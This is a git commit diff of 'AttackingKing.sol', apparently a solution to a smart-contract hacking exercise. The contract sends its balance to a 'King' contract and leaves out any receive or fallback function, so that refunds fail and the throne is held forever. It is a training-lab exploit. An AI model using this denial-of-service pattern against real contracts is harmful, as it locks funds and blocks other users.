716c3c18d54a3e5a65cd23d8633ee145ec1b3d4e
Yuehan Duan <yuehanduan@Yuehans-MacBook-Pro.local>
2023-01-21 19:14:41 +0100

    Refactor king contract hack

--- contracts/5. King/AttackingKing.sol
+++ contracts/5. King/AttackingKing.sol
@@ -10,12 +10,11 @@ contract AttackingKing {
         king = King(_king);
     }
 
+    // if no recieve or fallback function is defined, the contract will not be able to receive funds
+    // therefore, I will stay as the King forever!
+
     function hackContract() external {
         // Code me!
         address(king).call{value: address(this).balance}("");
-    }
-
-    receive() external payable {
-        require(false, "lol nope");
     }
 }
